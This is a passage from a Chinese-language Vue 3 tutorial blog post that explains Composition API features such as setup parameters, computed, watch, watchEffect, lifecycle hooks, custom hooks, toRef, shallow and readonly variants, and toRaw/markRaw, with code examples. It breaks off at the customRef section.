<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;Demo msg=&#x27;hello&#x27; addredd=&#x27;beijing&#x27;/&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	import Demo from &#x27;./components/Demo&#x27;</span><br><span class="line">    export default &#123;</span><br><span class="line">        name: &#x27;App&#x27;,</span><br><span class="line">        components: &#123;</span><br><span class="line">            Demo</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<p><code>Demo.vue</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="attr">props</span>: [<span class="string">&#x27;msg&#x27;</span>, <span class="string">&#x27;address&#x27;</span>],</span><br><span class="line">    <span class="title function_">set</span>(<span class="params">props</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(props)<span class="comment">// 会把接收到的所有props的值，整理成`Proxy`类型的对象</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="context参数"><a href="#context参数" class="headerlink" title="context参数"></a><code>context</code>参数</h5><ul>
<li><p>上下文对象，身上有三个属性使我们关心的</p>
</li>
<li><p><code>attrs</code></p>
<ul>
<li><code>vue2</code>的<code>$attrs</code><ul>
<li>父组件给子组件传了数据，子组件如果没有使用<code>props</code>接收，则会放在<code>this.$attrs</code>对象上</li>
</ul>
</li>
<li><code>vue3</code>的<code>attrs</code><ul>
<li>如果没有使用<code>props</code>接收到的数据，会放在<code>attrs</code>属性上，相当于<code>vue2</code>的<code>this.$attrs</code></li>
</ul>
</li>
</ul>
</li>
<li><p><code>emit</code></p>
<ul>
<li>如果给子组件绑定了自定义事件，<code>vue3</code>中需要使用<code>emits</code>数组配置项，在子组件中来接收命名，否则控制台会有警告</li>
</ul>
</li>
<li><p><code>slots</code></p>
<ul>
<li><p><code>vue2</code>中的插槽</p>
<ul>
<li>子组件的对象标签中，写了新的标签内容，会以虚拟<code>dom</code>的形式，挂载在父组件的<code>$slot</code>属性上（不论子组件有没有使用插槽来接收）</li>
</ul>
</li>
<li><p><code>vue3</code>中的插槽</p>
<ul>
<li>子组件的对象标签中，写了新的标签内容，会以虚拟<code>dom</code>的形式，<code>slots</code>属性上（不论子组件有没有使用插槽来接收）</li>
<li><code>vue3</code>中的具名插槽的写法，请使用<code>v-slot:name</code>，不要使用<code>vue2</code>的<code>slot=&quot;name&quot;</code>这种写法</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="小结：setup的两个注意点"><a href="#小结：setup的两个注意点" class="headerlink" title="小结：setup的两个注意点"></a>小结：<code>setup</code>的两个注意点</h4><ul>
<li><p><code>setup</code>执行的时机</p>
<ul>
<li>在<code>beforeCreate</code>之前执行一次，<code>this</code>是<code>undefined</code></li>
</ul>
</li>
<li><p><code>setup</code>的参数</p>
<ul>
<li><p><code>props</code>参数：值为对象，包含：组件外部传递过来，且组件内部声明接收了的属性</p>
</li>
<li><p><code>context</code>参数：上下文对象</p>
<ul>
<li><p><code>attrs</code>：值为对象，包含：组件外部传递过来，但没有在<code>props</code>配置中声明的属性，相当于<code>this.$attrs</code></p>
</li>
<li><p><code>slot</code>：收到的插槽内容，相当于<code>this.$slots</code></p>
</li>
<li><p><code>emit</code>：分发自定义事件的函数，相当于<code>this.$emit</code></p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="8-3-7-计算属性与监视"><a href="#8-3-7-计算属性与监视" class="headerlink" title="8.3.7.计算属性与监视"></a>8.3.7.计算属性与监视</h3><h4 id="8-3-7-1-computed函数"><a href="#8-3-7-1-computed函数" class="headerlink" title="8.3.7.1.computed函数"></a>8.3.7.1.<code>computed</code>函数</h4><ul>
<li><p>与<code>vue2.x</code>中<code>computed</code>配置功能一致</p>
</li>
<li><p>写法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;h2&gt;</span><br><span class="line">        &#123;&#123;person.fullName&#125;&#125;</span><br><span class="line">    &lt;/h2&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	import &#123;reactive, computed&#125; from &#x27;vue&#x27;</span><br><span class="line">    export default &#123;</span><br><span class="line">        setup() &#123;</span><br><span class="line">            // 数据</span><br><span class="line">            let person = reactive(&#123;</span><br><span class="line">                firstName: &#x27;张&#x27;,</span><br><span class="line">                lastName: &#x27;三&#x27;</span><br><span class="line">            &#125;)</span><br><span class="line">            </span><br><span class="line">            // 计算属性简写</span><br><span class="line">            // 注意可以直接给Proxy类型的person对象上，添加计算属性，也是响应式的</span><br><span class="line">            person.fullName1 = computed(() =&gt; &#123; </span><br><span class="line">                return person.firstName + &#x27;-&#x27; + person.lastName</span><br><span class="line">            &#125;)</span><br><span class="line"></span><br><span class="line">            // 计算属性完整写法</span><br><span class="line">            person.fullName2 = computed(&#123;</span><br><span class="line">                get() &#123;</span><br><span class="line">                    return person.firstName + &#x27;-&#x27; + person.lastName</span><br><span class="line">                &#125;,</span><br><span class="line">                set(value) &#123;</span><br><span class="line">                    const nameArr = value.split(&#x27;-&#x27;)</span><br><span class="line">                    person.firstName = nameArr[0]</span><br><span class="line">                    person.lastName = nameArr[1]</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">            </span><br><span class="line">            return &#123;</span><br><span class="line">                person            &#125;</span><br><span class="line">    	&#125;  </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="8-3-7-2-watch函数"><a href="#8-3-7-2-watch函数" class="headerlink" title="8.3.7.2.watch函数"></a>8.3.7.2.<code>watch</code>函数</h4><ul>
<li><p>与<code>vue2.x</code>中<code>watch</code>配置功能一致，接收三个参数</p>
<ul>
<li>监视的是谁</li>
<li>监视的回调</li>
<li>监视的配置</li>
</ul>
</li>
<li><p>两个注意点</p>
<ul>
<li>监视<code>reactive</code>定义的响应式数据时，<code>oldValue</code>无法正确获取、强制开启了深度监视（<code>deep</code>配置失效）</li>
<li>监视<code>reactive</code>定义的响应式数据中某个属性时，<code>deep</code>配置有效</li>
</ul>
</li>
<li><p>监视<code>ref</code>定义的响应式数据</p>
<p>写监视的对象时，监视的应该是一个结构，而不是具体的值</p>
<ul>
<li>如果是基本数据类型，不需要添加<code>.value</code>；</li>
<li>如果使用<code>ref</code>包裹了对象类型数据，监视时需要添加<code>.value</code><ul>
<li><code>RefImp</code>对象的<code>value</code>此时不再是一个具体的值，而是一个<code>Proxy</code>对象，再怎么修改这个对象里面的值，这个对象的内存地址也不会变，自然也就监视不到变化了</li>
<li>所以真正的要监视的，应该是通过<code>.value</code>获取到的<code>Proxy</code>对象</li>
<li>或者也可以不加<code>.value</code>，但是要添加深度监视配置项</li>
</ul>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">watch</span>(sum, <span class="function">(<span class="params">newValue, oldValue</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;sum变化了&#x27;</span>, newVlaue, oldValue)</span><br><span class="line">&#125;, &#123;<span class="attr">immediate</span>: <span class="literal">true</span>&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>监视多个<code>ref</code>定义的响应式数据</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">watch</span>([sum, msg], <span class="function">(<span class="params">newValue, oldValue</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;sum或msg变化了&#x27;</span>, newValue, oldValue)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>输出的也是数组：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220618143803425.png" alt="image-20220618143803425"></p>
</li>
<li><p>监视<code>reactive</code>定义的响应式数据</p>
<ul>
<li><p>若<code>watch</code>监视的是<code>reactive</code>定义的响应式数据，则无法正确获得<code>oldValue</code>，<code>newValue</code>和<code>oldValue</code>都是<code>Proxy</code>类型的对象</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220618144135227.png" alt="image-20220618144135227"></p>
<p>如果一定要获取<code>oldValue</code>，则用<code>ref</code>定义源数据</p>
</li>
<li><p>若<code>watch</code>监视的是<code>reactive</code>定义的响应式数据，则强制开启了深度监视（默认开启了），并且关闭不再生效</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">watch</span>(person, <span class="function">(<span class="params">newValue, oldValue</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;person变化了&#x27;</span>, newValue, oldValue)</span><br><span class="line">&#125;,&#123;<span class="attr">immediate</span>: <span class="literal">true</span>, <span class="attr">deep</span>: <span class="literal">false</span>&#125;) <span class="comment">// 此处的deep配置不再奏效</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>监视<code>reactive</code>定义的响应式数据中的某个属性，第一个参数要写成一个函数，此时的<code>deep</code>配置项是有效的</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">watch</span>(<span class="function">() =&gt;</span> person.<span class="property">age</span>, <span class="function">(<span class="params">newValue, oldValue</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;preson的age变化了&#x27;</span>, newValue, oldValue)</span><br><span class="line">&#125;) </span><br></pre></td></tr></table></figure>

<p>一般监视的属性是一个对象时，才会开启深度监视（获取不到<code>oldValue</code>）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">watch</span>(<span class="function">() =&gt;</span> person.<span class="property">job</span>, <span class="function">(<span class="params">newValue, oldValue</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;preson的job变化了&#x27;</span>, newValue, oldValue)</span><br><span class="line">&#125;, &#123;<span class="attr">immediate</span>: <span class="literal">true</span>, <span class="attr">deep</span>: <span class="literal">true</span>&#125;) <span class="comment">// job中还有salary属性，可以开启深度监视</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>监视<code>reactive</code>定义的响应式数据中的某些属性</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">watch</span>([<span class="function">() =&gt;</span> person.<span class="property">job</span>, <span class="function">() =&gt;</span> person.<span class="property">name</span>], <span class="function">(<span class="params">newValue, oldValue</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;preson的job或name变化了&#x27;</span>, newValue, oldValue)</span><br><span class="line">&#125;, &#123;<span class="attr">immediate</span>: <span class="literal">true</span>, <span class="attr">deep</span>: <span class="literal">true</span>&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="8-3-7-3-watchEffect函数"><a href="#8-3-7-3-watchEffect函数" class="headerlink" title="8.3.7.3.watchEffect函数"></a>8.3.7.3.<code>watchEffect</code>函数</h4><ul>
<li><p><code>watch</code>的套路是：既要指明监视的属性，也要指明监视的回调</p>
</li>
<li><p><code>watchEffect</code>的套路是，不用指明监视的是哪个属性，监视的回调中用到哪个属性，那就监视哪个属性</p>
</li>
<li><p><code>watchEffect</code>有点像<code>computed</code>：</p>
<ul>
<li><p>但<code>computed</code>注重计算出来的值（回调函数的返回值），所以必须要写返回值</p>
</li>
<li><p>而<code>watchEffect</code>更注重的是过程（回调函数的函数体），多以不用写返回值</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// watchEffect所指定的回调中，用到的数据只要发生了变化，则直接重新执行回调</span></span><br><span class="line"><span class="title function_">watchEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> x1 = sum.<span class="property">value</span></span><br><span class="line">    <span class="keyword">const</span> x2 = person.<span class="property">age</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;watchEffect配置的回调执行了&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="8-3-8-生命周期"><a href="#8-3-8-生命周期" class="headerlink" title="8.3.8.生命周期"></a>8.3.8.生命周期</h3><ul>
<li><code>vue3</code>中可以继续使用<code>vue2</code>中的生命周期钩子，但有两个被更名：<ul>
<li><code>beforeDestroy</code>改名为<code>beforeUnmount</code></li>
<li><code>destroyed</code>改名为<code>unmounted</code></li>
</ul>
</li>
<li><code>vue3</code>中也提供了<code>Compsition API</code>形式的生命周期钩子，与<code>vue2</code>中钩子的对应关系如下：<ul>
<li><code>beforeCreate</code>&#x3D;&#x3D;&#x3D;&gt;<code>setup()</code></li>
<li><code>created</code>&#x3D;&#x3D;&#x3D;&gt;<code>setup()</code></li>
<li><code>beforeMount</code>&#x3D;&#x3D;&#x3D;&gt;<code>onBeforeMount</code></li>
<li><code>mounted</code>&#x3D;&#x3D;&#x3D;&gt;<code>onMounted</code></li>
<li><code>beforeUpdate</code>&#x3D;&#x3D;&#x3D;&gt;<code>onBeforeUpdate</code></li>
<li><code>updated</code>&#x3D;&#x3D;&#x3D;&gt;<code>onUpdated</code></li>
<li><code>beforeUnmount</code>&#x3D;&#x3D;&#x3D;&gt;<code>onBeforeUnmount</code></li>
<li><code>unmounted</code>&#x3D;&#x3D;&#x3D;&gt;<code>onUnmounted</code></li>
<li>备注：使用时需要引入</li>
</ul>
</li>
</ul>
<h3 id="8-3-9-自定义hook函数"><a href="#8-3-9-自定义hook函数" class="headerlink" title="8.3.9.自定义hook函数"></a>8.3.9.自定义<code>hook</code>函数</h3><ul>
<li>什么是<code>hook</code><ul>
<li>本质是一个函数，把<code>setup</code>函数中使用的<code>Composition API</code>进行了封装</li>
<li>类似<code>vue2</code>中的<code>mixin</code></li>
</ul>
</li>
<li>自定义<code>hook</code>的优势<ul>
<li>复用代码，让<code>setup</code>中的逻辑更清楚易懂</li>
</ul>
</li>
</ul>
<p>定义<code>hook</code></p>
<p><code>hook/usePoint.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;reactive, onMounted, onBeforeUnmount&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> point = <span class="title function_">reactive</span>(&#123;</span><br><span class="line">        <span class="attr">x</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">y</span>: <span class="number">0</span></span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">savePoint</span>(<span class="params">event</span>) &#123;</span><br><span class="line">        point.<span class="property">x</span> = event.<span class="property">pageX</span></span><br><span class="line">        point.<span class="property">y</span> = event.<span class="property">pageY</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(event.<span class="property">pageX</span>, event.<span class="property">pageY</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">onMounted</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, savePoint)</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">onBeforeUnmount</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">window</span>.<span class="title function_">removeEventListener</span>(<span class="string">&#x27;click&#x27;</span>, savePoint)</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> point</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用<code>hook</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;h2&gt;</span><br><span class="line">        当前点击鼠标时的坐标为：x：&#123;&#123;point.x&#125;&#125;，y：&#123;&#123;point.y&#125;&#125;</span><br><span class="line">    &lt;/h2&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	import userPoint from &#x27;../hooks/usePoint&#x27;</span><br><span class="line">    export default &#123;</span><br><span class="line">        setup() &#123;</span><br><span class="line">            const point = usePoint()</span><br><span class="line">            return &#123;</span><br><span class="line">                point</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h3 id="8-3-10-toRef"><a href="#8-3-10-toRef" class="headerlink" title="8.3.10.toRef"></a>8.3.10.<code>toRef</code></h3><p>使用<code>reactive</code>包裹深层次对象，在使用时需要写多个点，很麻烦，可以用<code>toRef</code>来替代这个操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;!-- 此时不需要person.name --&gt;</span><br><span class="line">	&lt;h2&gt;&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	import &#123;reactive, toRef&#125; from &#x27;vue&#x27;</span><br><span class="line">    export default &#123;</span><br><span class="line">        setup() &#123;</span><br><span class="line">            let person = &#123;</span><br><span class="line">                name: &#x27;sai&#x27;,</span><br><span class="line">                age:18,</span><br><span class="line">                job: &#123;</span><br><span class="line">                    j1: &#123;</span><br><span class="line">                        salary: 30</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            const name = toRef(person, &#x27;name&#x27;) // 返回的是一个引用实现对象，其value指向person.name，如果使用ref(person, &#x27;name&#x27;)，则是复制创建了一个新的引用实现对象，不存在引用关系了</span><br><span class="line">            const salary = toRef(person.job.j1, &#x27;salary&#x27;) // 第一个参数，传递一个对象</span><br><span class="line">            return &#123;</span><br><span class="line">                person, </span><br><span class="line">                name, // 需要单独使用的属性</span><br><span class="line">                salary // 简写形式，等价于salary: toRef(person.job.j1, &#x27;salary&#x27;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<ul>
<li><p>作用，创建一个<code>ref</code>对象，其<code>value</code>值指向另一个对象中的某个属性</p>
</li>
<li><p>语法：<code>const name = toRef(person, &#39;name&#39;)</code></p>
</li>
<li><p>应用：要将响应式对象中的某个属性，单独提供给外部使用时</p>
</li>
<li><p>扩展：<code>toRefs</code>与<code>toRef</code>功能一致，但可以批量创建多个<code>ref</code>对象，语法：<code>toRefs(person)</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> x = <span class="title function_">toRefs</span>(person)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x)</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220620064618982.png" alt="image-20220620064618982"></p>
<p>返回值是一个对象，<code>return</code>的时候需要解构赋值</p>
<p>返回对象的<code>key</code>，是源对象的<code>key</code>，</p>
<ul>
<li>若源对象<code>key</code>是基本数据类型，则<code>key</code>对应的属性值，是一个引用实现对象，模板中使用时不用加<code>.value</code>进行调用，</li>
<li>若源对象<code>key</code>的值仍是一个对象，则<code>key</code>对应的属性值，是一个<code>Proxy</code>实例对象</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">    ...<span class="title function_">toRefs</span>(person)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="8-4-其它Composition-API"><a href="#8-4-其它Composition-API" class="headerlink" title="8.4.其它Composition API"></a>8.4.其它<code>Composition API</code></h2><h3 id="8-4-1-shallowReactive和shallowRef"><a href="#8-4-1-shallowReactive和shallowRef" class="headerlink" title="8.4.1.shallowReactive和shallowRef"></a>8.4.1.<code>shallowReactive</code>和<code>shallowRef</code></h3><ul>
<li><p><code>shallowReactive</code>：只处理对象最外层属性的响应式（浅响应式）</p>
</li>
<li><p><code>shallowRef</code>：只处理基本数据类型的响应式，不进行对象的响应式处理</p>
<ul>
<li><p>传的是基本类型，和<code>ref</code>一样</p>
</li>
<li><p>传的是对象类型数据，就不再求助于<code>reactive</code>了，就不再是响应式了</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220620071743944.png" alt="image-20220620071743944"></p>
</li>
</ul>
</li>
<li><p>什么时候使用</p>
<ul>
<li>如果有一个对象数据，结构比较深，但变化时只是外层属性变化，使用<code>shallowReactive</code></li>
<li>如果有一个对象数据，后续功能不会修改该对象中的属性，而是生成新的对象来替换，使用<code>shallowRef</code></li>
</ul>
</li>
</ul>
<h3 id="8-4-2-readonly与shallowReadonly"><a href="#8-4-2-readonly与shallowReadonly" class="headerlink" title="8.4.2.readonly与shallowReadonly"></a>8.4.2.<code>readonly</code>与<code>shallowReadonly</code></h3><ul>
<li><p><code>readonly</code>：让一个响应式数据变为只读的（深只读）</p>
<ul>
<li><p><code>readonly</code>是一个函数，接收响应式数据作为参数</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">setup</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> person = <span class="title function_">reactive</span>(&#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span>,</span><br><span class="line">        <span class="attr">age</span>: <span class="number">18</span>,</span><br><span class="line">        <span class="attr">job</span>: &#123;</span><br><span class="line">            <span class="attr">j1</span>: &#123;</span><br><span class="line">                <span class="attr">salary</span>: <span class="number">30</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    person = <span class="title function_">readonly</span>(person)</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        ...<span class="title function_">toRefs</span>(person)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>shallowReadonly</code>：让一个响应式数据变为只读的（浅只读）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">person = <span class="title function_">shallowReadonly</span>(person)</span><br></pre></td></tr></table></figure>

<p>上述例子中，若使用<code>shallowReadonly</code>函数进行处理，则第一层数据不允许修改，但是里面的<code>salary</code>还是可以修改的</p>
<p>对于<code>ref</code>包裹的响应式数据，没有必要用<code>shallowReadonly</code>，因为基本数据类型始终就是一层</p>
</li>
<li><p>应用场景：不希望数据被修改时</p>
<ul>
<li><code>person</code>的数据不是自己定义的，用的是别人的组件，接收的时候可以用<code>readonly</code>限制一下，防止误操作</li>
</ul>
</li>
</ul>
<h3 id="8-4-3-toRaw与markRaw"><a href="#8-4-3-toRaw与markRaw" class="headerlink" title="8.4.3.toRaw与markRaw"></a>8.4.3.<code>toRaw</code>与<code>markRaw</code></h3><ul>
<li><p><code>toRaw</code></p>
<ul>
<li><p>作用：将一个由<code>reactive</code>生成的响应式对象，变成普通对象（不能处理<code>ref</code>定义的响应式数据）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> person = <span class="title function_">reactive</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">18</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showRawPerson</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> p = <span class="title function_">toRaw</span>(person)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(p)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>应用场景：用于读取响应式对象对应的普通对象，对这个普通对象的所有操作，不会引起页面更新</p>
</li>
</ul>
</li>
<li><p><code>makeRaw</code></p>
<ul>
<li>作用：标记一个对象，使其永远不会再成为响应式对象<ul>
<li>但是对于数据的更改仍然是生效的，只是<code>vue</code>不再做响应式处理了</li>
</ul>
</li>
<li>应用场景：<ul>
<li>有些值不应被设置为响应式的，例如复杂的第三方类库等</li>
<li>当渲染具有不可变数据源的大列表时，跳过响应式转换可以提高性能</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="8-4-4-customRef"><a href="#8-4-4-customRef" class="headerlink" title="8.4.4.customRef"></a>8.4.4.<code>customRef</code></h3><ul>
